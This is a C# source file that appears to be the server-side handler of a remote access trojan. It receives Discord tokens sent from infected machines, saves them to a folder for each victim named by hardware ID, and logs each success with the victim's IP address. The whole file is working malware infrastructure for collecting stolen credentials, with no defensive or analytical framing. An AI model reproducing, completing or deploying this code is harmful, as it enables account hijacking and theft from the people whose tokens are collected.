using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet;

public class HandleDiscordRecovery
{
	public HandleDiscordRecovery(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string text = Path.Combine(Application.get_StartupPath(), "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Discord");
			string asString = unpack_msgpack.ForcePathObject("Tokens").AsString;
			if (!string.IsNullOrWhiteSpace(asString))
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllText(text + "\\Tokens_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
				new HandleLogs().Addmsg("Client " + client.Ip + " discord recovery success，file located @ ClientsFolder \\ " + unpack_msgpack.ForcePathObject("Hwid").AsString + " \\ Discord", Color.Purple);
			}
			else
			{
				new HandleLogs().Addmsg("Client " + client.Ip + " discord recovery error", Color.MediumPurple);
			}
			client?.Disconnected();
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg(ex.Message, Color.Red);
		}
	}
}
